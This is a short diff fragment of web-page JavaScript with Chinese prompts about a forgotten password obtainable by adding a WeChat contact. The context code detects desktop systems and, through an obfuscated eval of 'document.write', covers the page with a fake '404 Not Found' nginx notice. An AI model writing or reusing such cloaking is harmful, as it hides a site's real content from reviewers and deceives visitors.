@@ -28,6 +28,7 @@ var wangji="密码是不是忘记了？";
 var lianxi="可以加微信xiaosse获取";
 
 		}
+		}		
     if(system.win||system.mac||system.xll){
 		let temp = '<div style="position: fixed; top: 0px;padding-top:20px; z-index: 99999; width: 100%; height: '+win_Height+'px; background-color: #ffffff; font-size: 16px;"><center><h2>404 Not Found</h2></center><hr><center>nginx pc</center></div>';
 		eval("do"+"cu"+"ment.wr"+"ite('"+temp+"');");
